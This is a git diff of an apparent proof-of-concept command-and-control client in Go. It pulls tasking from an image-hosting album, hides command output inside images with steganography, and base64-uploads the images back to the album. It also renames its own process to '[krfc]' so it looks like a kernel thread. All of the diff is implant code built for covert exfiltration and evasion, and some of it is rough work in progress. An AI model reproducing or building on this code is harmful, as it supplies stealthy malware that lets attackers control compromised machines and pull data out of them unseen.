@@ -2,6 +2,8 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"encoding/base64"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -13,10 +15,13 @@ import (
 	"strings"
 	"unsafe"
 
+	_ "image/jpeg"
+
 	// Internal libs
 	"github.com/AntiMatter/cmd"
 
 	// External libs
+	stego "github.com/auyer/steganography"
 	"github.com/fatih/color"
 )
 
@@ -67,6 +72,7 @@ func getTasking(albumID string, clientID string) (out []uint8) {
 	}
 	//fmt.Println(string(contents))
 	imageMem = string(contents)
+	//fmt.Println(imageMem)
 
 	fmt.Println(color.GreenString("Response") + ":")
 	fmt.Println(" ")
@@ -84,12 +90,8 @@ func getTasking(albumID string, clientID string) (out []uint8) {
 
 }
 
-// decodeImage will decode the tasking image, and then run the command and grab the output, store it somewhere as a return value maybe?
-func decodeImage() {
-
-}
-
 // encodeOutput will take the command output and encode it into another image (in memory?) and upload it to the configured album
+// Need to encode variable `out` into `imageMem`
 func encodeOutput() {
 	out := getTasking(clientOptions["AlbumID"], clientOptions["ClientID"])
 	fmt.Println(color.GreenString("Output:"))
@@ -97,43 +99,94 @@ func encodeOutput() {
 	fmt.Printf("%s", out)
 	fmt.Println(" ")
 
+	// func CreateImage(command string, origPic string, newPic string)
+	//cmd.CreateImage(string(out))
+
+	// Confirmed that this is the valid image we want
+	imageMem := cmd.GrabRandomImage()
+
+	// Confirmed that this actually does encode the output into the image downloaded
+	// For some reason I can write this image data to disk and decode it no problem
+	w := new(bytes.Buffer)
+	err := stego.Encode(w, imageMem, []byte(out))
+	if err != nil {
+		fmt.Println("What ~Stego~:", err)
+	}
+
+	// Create TmpFile
+	tmpfile, err := ioutil.TempFile("", "resp")
+	if err != nil {
+		fmt.Println("What ~tempFile~: ", err)
+	}
+	// Clean up
+	defer os.Remove(tmpfile.Name())
+
+	// Write data to tmpFile
+	if _, err := tmpfile.Write(w.Bytes()); err != nil {
+		fmt.Println("What ~WriteTmpFile~: ", err)
+	}
+	if err := tmpfile.Close(); err != nil {
+		fmt.Println("What ~closeTmpFile~: ", err)
+	}
+
 	fmt.Print("Please enter the Album-DeleteHash to upload response to >> ")
-	reader := bufio.NewReader(os.Stdin)
-	albumDeleteHash, err := reader.ReadString('\n')
+	reader2 := bufio.NewReader(os.Stdin)
+	albumDeleteHash, err := reader2.ReadString('\n')
 	if err != nil {
 		fmt.Println(err)
 	}
 	albumDeleteHash = strings.TrimSuffix(albumDeleteHash, "\n")
-	cmd.UploadImage(imageMem, "Response", albumDeleteHash, "Within this is a response", clientOptions["ClientID"])
+
+	// This is reading the contents of the test TempFile
+	imageData, err := ioutil.ReadFile(tmpfile.Name())
+	if err != nil {
+		fmt.Println("What ~ReadTmpFile~: ", err)
+	}
+
+	// This method works, maybe I'll try tempfile again...tempfile worked after b64-encoding it
+
+	//f, _ := os.Open("rando.jpg")
+
+	reader := bytes.NewReader(imageData)
+	content, _ := ioutil.ReadAll(reader)
+
+	encoded := base64.StdEncoding.EncodeToString(content)
+
+	cmd.UploadImage(encoded, "Response", albumDeleteHash, "Within this is a response", clientOptions["ClientID"])
 
 }
 
 func main() {
 
 	// Keep in mind the binary name has to be at least as long if not longer than your desired name
-	err := ChangeProcName("[krf]")
+	err := ChangeProcName("[krfc]")
 	if err != nil {
 		fmt.Println(err.Error())
 	}
 
 	albumID := flag.String("album-id", "", "The album ID to retrieve tasking and upload responses")
+	clientID := flag.String("client-id", "", "The client ID of the user / albums")
 
 	flag.Parse()
 
 	fmt.Println("This is the client PoC...")
-	fmt.Print("Please enter the Client-ID >> ")
 
 	reader := bufio.NewReader(os.Stdin)
-	// ReadString will block until the delim is entered
-	clientID, err := reader.ReadString('\n')
-	if err != nil {
-		fmt.Println("An error occured while reading input: ", err)
-		os.Exit(1)
-	}
-	// Remove the delim from the string
-	clientID = strings.TrimSuffix(clientID, "\n")
+	if *clientID == "" {
+		fmt.Print("Please enter the Client-ID >> ")
+		// ReadString will block until the delim is entered
+		clientID, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Println("An error occured while reading input: ", err)
+			os.Exit(1)
+		}
+		// Remove the delim from the string
+		clientID = strings.TrimSuffix(clientID, "\n")
 
-	clientOptions["ClientID"] = clientID
+		clientOptions["ClientID"] = clientID
+	} else {
+		clientOptions["ClientID"] = *clientID
+	}
 
 	// Check to see if the flag was set or not, if not then prompt user to enter value
 	if *albumID == "" {
